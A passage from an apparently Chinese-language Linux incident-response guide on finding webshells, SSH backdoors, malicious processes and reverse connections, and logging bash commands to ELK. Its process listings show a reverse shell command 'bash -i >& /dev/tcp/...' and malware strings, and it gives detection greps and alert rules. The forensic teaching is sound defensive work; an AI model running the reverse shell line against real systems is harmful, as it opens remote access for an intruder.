type=EXECVE&nbsp;msg=audit(1500280229.507:7665):&nbsp;argc=1&nbsp;a0=&quot;pwd&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里还需考虑的一个问题是白名单，例如公司的一些站点本身就会调用视频处理的一些功能，也会调用系统命令。所以为了避免误报，需要新增一个白名单功能。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里我们修改一下local_rules.xml，新增白名单规则，并且放到EXECVE规则上面。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:xml;toolbar:false">&lt;group&nbsp;name=&quot;syslog,auditd,&quot;&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110000&quot;&nbsp;level=&quot;0&quot;&nbsp;noalert=&quot;1&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;decoded_as&gt;auditd&lt;/decoded_as&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;AUDITD&nbsp;messages&nbsp;grouped.&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110001&quot;&nbsp;level=&quot;0&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;if_sid&gt;110000&lt;/if_sid&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;regex&gt;whoami|passwd&lt;/regex&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Java&nbsp;execution&nbsp;white&nbsp;list&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110002&quot;&nbsp;level=&quot;10&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;if_sid&gt;110000&lt;/if_sid&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;match&gt;EXECVE&lt;/match&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Java&nbsp;execution&nbsp;command&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&lt;/group&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如上所示，执行<strong>whoami</strong>和<strong>cat /etc/passwd</strong>的时候不会产生告警。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 0, 0);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其他</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果没有通过上述途径找到Webshell，可以通过Access Log获取一些信息。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">1）扫描特征</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通常日志中会伴随一些其他攻击特征，例如可以用如下语句</span></p><pre class="brush:bash;toolbar:false">egrep&nbsp;&#39;(select|script|acunetix|sqlmap)&#39;&nbsp;/var/log/httpd/access_log</pre><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）访问频次</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">重点关注POST请求</span></p><pre class="brush:bash;toolbar:false">grep&nbsp;&#39;POST&#39;&nbsp;/var/log/httpd/access_log&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$1}&#39;&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-nr</pre><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3）Content-Length</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Content-Length过大的请求，例如过滤Content-Length大于5M的日志</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">awk &#39;{if($10&gt;5000000){print $0}}&#39; /var/log/httpd/access_log</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注意</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里如果发现文件，<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);"><strong>不要直接用vim查看编辑文件内容，这样会更改文件的mtime</strong></span>，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x02 SSH服务</span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">查看登录信息</span></strong></span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">登录成功：</span></strong></p><pre class="brush:bash;toolbar:false">grep&nbsp;&#39;Accepted&#39;&nbsp;/var/log/secure&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$11}&#39;&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-nr</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">或者last命令，它会读取位于/var/log/wtmp的文件，并把该文件记录的登录系统的用户名单，全部显示出来。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">登录失败：</span></strong></p><pre class="brush:bash;toolbar:false">grep&nbsp;&#39;Failed&#39;&nbsp;/var/log/secure&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$11}&#39;&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-nr</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">或者lastb命令，会读取位于/var/log/btmp的文件，并把该文件记录的登入系统失败的用户名单，全部显示出来。</span></p><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">检查SSH后门</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）比对ssh的版本</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;ssh&nbsp;-V</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）查看ssh配置文件和/usr/sbin/sshd的时间</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;stat&nbsp;/usr/sbin/sshd</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3）strings检查/usr/sbin/sshd，看是否有邮箱信息</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过strings /usr/sbin/sshd可以查看到邮箱信息。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4）通过strace监控sshd进程读写文件的操作</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">ps&nbsp;axu&nbsp;|&nbsp;grep&nbsp;sshd&nbsp;|&nbsp;grep&nbsp;-v&nbsp;grep
root&nbsp;65530&nbsp;0.0&nbsp;0.1&nbsp;48428&nbsp;1260&nbsp;?&nbsp;Ss&nbsp;13:43&nbsp;0:00&nbsp;/usr/sbin/sshd
strace&nbsp;-o&nbsp;aa&nbsp;-ff&nbsp;-p&nbsp;65530
grep&nbsp;open&nbsp;aa*&nbsp;|&nbsp;grep&nbsp;-v&nbsp;-e&nbsp;No&nbsp;-e&nbsp;null&nbsp;-e&nbsp;denied|&nbsp;grep&nbsp;WR
aa.102586:open(&quot;/tmp/ilog&quot;,&nbsp;O_WRONLY|O_CREAT|O_APPEND,&nbsp;0666)&nbsp;=&nbsp;4</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0x03 进程</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程也会隐藏。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）资源占用</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Top然后找到CPU和MEM排序</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2）启动时间</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可疑与前面找到的Webshell时间点比对。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3）启动权限</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">mysql&nbsp;63763&nbsp;45.3&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;R&nbsp;01:18&nbsp;470:54&nbsp;./db_temp/dazui.4
mysql&nbsp;63765&nbsp;0.0&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;S&nbsp;01:18&nbsp;0:01&nbsp;./db_temp/dazui.4
mysql&nbsp;63766&nbsp;0.0&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;S&nbsp;01:18&nbsp;0:37&nbsp;./db_temp/dazui.4
mysql&nbsp;64100&nbsp;45.2&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;R&nbsp;01:20&nbsp;469:07&nbsp;./db_temp/dazui.4
mysql&nbsp;64101&nbsp;0.0&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;S&nbsp;01:20&nbsp;0:01&nbsp;./db_temp/dazui.4</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4）父进程</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如我在菜刀中反弹Bash</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;html]#&nbsp;ps&nbsp;-ef&nbsp;|&nbsp;grep&nbsp;&#39;/dev/tcp&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;grep
apache&nbsp;26641&nbsp;1014&nbsp;0&nbsp;14:59&nbsp;?&nbsp;00:00:00&nbsp;sh&nbsp;-c&nbsp;/bin/sh&nbsp;-c&nbsp;&quot;cd&nbsp;/root/apache-tomcat-6.0.32/webapps/ROOT/;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/192.168.192.144/2345&nbsp;0&gt;&amp;1;echo&nbsp;[S];pwd;echo&nbsp;[E]&quot;&nbsp;2&gt;&amp;1</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">父进程进程号1014</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;html]#&nbsp;ps&nbsp;-ef&nbsp;|&nbsp;grep&nbsp;1014
apache&nbsp;1014&nbsp;1011&nbsp;0&nbsp;Sep19&nbsp;?&nbsp;00:00:00&nbsp;/usr/sbin/httpd</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到父进程为apache，就可以判断攻击者通过Web入侵。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取到可疑进程号之后，可疑使用<strong>lsof -p pid</strong>查看相关文件和路径。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">udp&nbsp;0&nbsp;0&nbsp;0.0.0.0:49937&nbsp;0.0.0.0:*&nbsp;131683/ls&nbsp;-la&nbsp;
udp&nbsp;0&nbsp;0&nbsp;0.0.0.0:47584&nbsp;0.0.0.0:*&nbsp;116515/ifconfig</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">使用lsof -p pid可以看到可执行文件</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@DataNode105&nbsp;admin]#&nbsp;lsof&nbsp;-p&nbsp;131683
COMMAND&nbsp;PID&nbsp;USER&nbsp;FD&nbsp;TYPE&nbsp;DEVICE&nbsp;SIZE/OFF&nbsp;NODE&nbsp;NAME
hahidjqzx&nbsp;131683&nbsp;root&nbsp;cwd&nbsp;DIR&nbsp;8,98&nbsp;4096&nbsp;18087937&nbsp;/root
hahidjqzx&nbsp;131683&nbsp;root&nbsp;rtd&nbsp;DIR&nbsp;8,98&nbsp;4096&nbsp;2&nbsp;/
hahidjqzx&nbsp;131683&nbsp;root&nbsp;txt&nbsp;REG&nbsp;8,98&nbsp;625622&nbsp;24123895&nbsp;/usr/bin/hahidjqzxs</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以文件类型可以使用file获取；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;tmp]#&nbsp;file&nbsp;.zl
zl:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;statically&nbsp;linked,&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.9,&nbsp;not&nbsp;stripped</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于二进制的文件可以使用strings读取可读字符</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;tmp]#&nbsp;strings&nbsp;.zl
rm&nbsp;-f&nbsp;/boot/IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/boot/.IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/boot/IptabLex&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/boot/.IptabLex&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr
/IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr/.IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr/IptabLex&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr/.IptabLex
netstat&nbsp;-anp&nbsp;|&nbsp;grep&nbsp;&quot;IptabLes&quot;&nbsp;|awk&nbsp;&#39;{print&nbsp;$NF}&#39;&nbsp;|cut&nbsp;-d&nbsp;&quot;/&quot;&nbsp;-f&nbsp;1&nbsp;|&nbsp;xargs&nbsp;kill&nbsp;-9&nbsp;&gt;&nbsp;/dev/null&nbsp;;free&nbsp;-m&nbsp;
&gt;&nbsp;/dev/null
netstat&nbsp;-anp&nbsp;|&nbsp;grep&nbsp;&quot;IptabLex&quot;&nbsp;|awk&nbsp;&#39;{print&nbsp;$NF}&#39;&nbsp;|cut&nbsp;-d&nbsp;&quot;/&quot;&nbsp;-f&nbsp;1&nbsp;|&nbsp;xargs&nbsp;kill&nbsp;-9&nbsp;&gt;&nbsp;/dev/null&nbsp;;free&nbsp;-m&nbsp;
&gt;&nbsp;/dev/null</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@i-9kp9tipm&nbsp;log]#&nbsp;strings&nbsp;/usr/bin/.sshd&nbsp;|&nbsp;egrep&nbsp;&#39;[1-9]{1,3}\.[1-9]{1,3}\.&#39;
8.8.8.8
8.8.4.4
8.8.8.8
61.132.163.68
202.102.192.68
202.102.213.68
58.242.2.2
202.38.64.1
211.91.88.129
211.138.180.2
218.104.78.2
202.102.199.68
202.175.3.3</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0x04 网络连接</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接是可以被隐藏的。</span></p><pre class="brush:bash;toolbar:false">netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;ESTABLISHED</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">查看已经建立的网络连接，例如反弹bash</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;html]#&nbsp;netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;EST&nbsp;|&nbsp;grep&nbsp;bash
tcp&nbsp;0&nbsp;0&nbsp;192.168.192.120:41320&nbsp;192.168.192.144:2345&nbsp;ESTABLISHED&nbsp;26643/bash
netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;LISTEN</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">检查可以监听端口，例如攻击者在本地开启sock5代理，然后使用SSH反弹sock5。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;html]#&nbsp;netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;LISTEN&nbsp;|&nbsp;grep&nbsp;1080
tcp&nbsp;0&nbsp;0&nbsp;0.0.0.0:1080&nbsp;0.0.0.0:*&nbsp;LISTEN&nbsp;26810/python
lsof&nbsp;-i:{port}</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0x05 敏感目录</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;~]#&nbsp;ls&nbsp;-ald&nbsp;/tmp/
drwxrwxrwt.&nbsp;10&nbsp;root&nbsp;root&nbsp;4096&nbsp;9月&nbsp;20&nbsp;09:41&nbsp;/tmp/
[root@server120&nbsp;~]#&nbsp;ls&nbsp;-ald&nbsp;/var/tmp/
drwxrwxrwt.&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;9月&nbsp;18&nbsp;16:57&nbsp;/var/tmp/
[root@server120&nbsp;~]#&nbsp;ls&nbsp;-ald&nbsp;/dev/shm
drwxrwxrwt.&nbsp;3&nbsp;root&nbsp;root&nbsp;60&nbsp;9月&nbsp;1&nbsp;10:23&nbsp;/dev/shm</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0x06 history</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。之前写的关于Bash审计方式也很推荐。从Bash4.1 版本开始，Bash开始支持Rsyslog，</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下载bash-4.4，下载地址： <a href="https://ftp.gnu.org/gnu/bash/">https://ftp.gnu.org/gnu/bash/</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在本机编译一份</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）修改bashhist.c：</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">修改771行</span></p><pre class="brush:cpp;toolbar:false">syslog&nbsp;(SYSLOG_FACILITY|SYSLOG_LEVEL,&nbsp;&quot;PID=%d&nbsp;UID=%d&nbsp;User=%s&nbsp;Cmd=%s&quot;,&nbsp;getpid(),&nbsp;current_user.uid,&nbsp;current_user.user_name,&nbsp;line);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">修改776行</span></p><pre class="brush:cpp;toolbar:false">syslog&nbsp;(SYSLOG_FACILITY|SYSLOG_LEVEL,&nbsp;&quot;PID=%d&nbsp;UID=%d&nbsp;User=%s&nbsp;Cmd=%s&quot;,&nbsp;getpid(),&nbsp;current_user.uid,&nbsp;current_user.user_name,&nbsp;trunc);</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）再修改config-top.h</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">去掉115行/**/</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">syslog的FACILITY为 user，日志级别为info</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3）</span></strong></p><pre class="brush:bash;toolbar:false">./configure&nbsp;--prefix=/usr/local/bash&nbsp;&amp;&amp;&nbsp;make&nbsp;&amp;&amp;&nbsp;make&nbsp;install</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">将<strong>/usr/local/bash/bin/bash</strong>拷贝出来</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">备份线上服务器原/bin/bash</span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;~]#&nbsp;mv&nbsp;/bin/bash&nbsp;/bin/bashbak</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">RZ放到线上服务器</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">修改权限为755</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4）修改rsyslog配置，这里我们先输出到本地测试一下</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@zaojiasys_31&nbsp;admin]#&nbsp;touch&nbsp;/var/log/bash.log
[root@zaojiasys_31&nbsp;admin]#&nbsp;vim&nbsp;/etc/rsyslog.conf</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">添加user.info /var/log/bash.log</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@zaojiasys_31&nbsp;admin]#&nbsp;service&nbsp;rsyslog&nbsp;restart
[root@zaojiasys_31&nbsp;admin]#&nbsp;tail&nbsp;-f&nbsp;/var/log/bash.log&nbsp;
Jul&nbsp;25&nbsp;16:22:15&nbsp;localhost&nbsp;bash[18540]:&nbsp;PID=18540&nbsp;UID=0&nbsp;User=root&nbsp;Cmd=tail&nbsp;-f&nbsp;/var/log/bash.log&nbsp;
Jul&nbsp;25&nbsp;16:22:21&nbsp;localhost&nbsp;bash[19033]:&nbsp;PID=19033&nbsp;UID=0&nbsp;User=root&nbsp;Cmd=whoami
5）
[root@zaojiasys_31&nbsp;admin]#&nbsp;vim&nbsp;/etc/rsyslog.conf</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">修改*.info;mail.none;authpriv.none;cron.none;local6.none;user.none /var/log/messages 添加user.none</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">添加user.info @10.110.1.33:3514</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用ELK，首先配置logstash</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">input&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;syslog{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port&nbsp;=&gt;&nbsp;&quot;3514&quot;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type&nbsp;=&gt;&nbsp;&quot;bash&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
}
filter&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;grok{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;match&nbsp;=&gt;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;message&quot;&nbsp;=&gt;&nbsp;&quot;PID=%{NUMBER:processid}&nbsp;UID=%{NUMBER:uid}&nbsp;User=%{WORD:user}&nbsp;Cmd=%{GREEDYDATA:cmd}&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;date&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;match&nbsp;=&gt;&nbsp;[&quot;timestamp&quot;,&nbsp;&quot;MMM&nbsp;dd&nbsp;HH:mm:ss&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&gt;&nbsp;&quot;@timestamp&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;locale&quot;&nbsp;=&gt;&nbsp;&quot;en&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;timezone&nbsp;=&gt;&nbsp;&quot;UTC&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mutate&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;remove_field&nbsp;=&gt;&nbsp;[&nbsp;&quot;message&quot;&nbsp;]
&nbsp;&nbsp;&nbsp;&nbsp;}
}
output&nbsp;{
&nbsp;&nbsp;&nbsp;if&nbsp;&quot;_grokparsefailure&quot;&nbsp;not&nbsp;in&nbsp;[tags]&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elasticsearch&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts&nbsp;=&gt;&nbsp;&quot;10.110.1.33:9200&quot;
